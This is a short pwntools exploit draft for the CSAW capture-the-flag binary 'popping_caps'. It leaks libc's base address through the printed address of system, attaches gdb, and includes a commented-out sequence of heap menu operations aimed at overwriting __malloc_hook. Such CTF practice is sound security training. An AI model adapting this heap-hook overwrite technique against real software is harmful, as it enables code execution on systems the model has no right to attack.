from pwn import *

libc = ELF("./libc.so.6")

p = process("./popping_caps")
#p = remote("pwn.chal.csaw.io", 1001)

p.recvuntil("system 0x")
libc_base = int(p.recvline(), 16) - libc.symbols["system"]

print("{:#x}".format(libc_base))

test = libc_base + 0x7f4a273761a8 - 0x7f4a26f8b000 + 8 

print("{:#x}".format(test))

gdb.attach(p)

p.sendlineafter(":", "2")
p.sendlineafter(":", str(test))

"""
p.sendlineafter(":", "1")
p.sendlineafter(":", str(0x30))

p.sendlineafter(":", "2")
p.sendlineafter(":", "0")

p.sendlineafter(":", "2")
p.sendlineafter(":", "0")

p.sendlineafter(":", "1")
p.sendlineafter(":", str(0x30))

p.sendlineafter(":", "3")
p.sendafter(":", p64(libc_base + libc.symbols["__malloc_hook"]))

p.sendlineafter(":", "1")
p.sendlineafter(":", str(0x30))
"""
p.interactive()
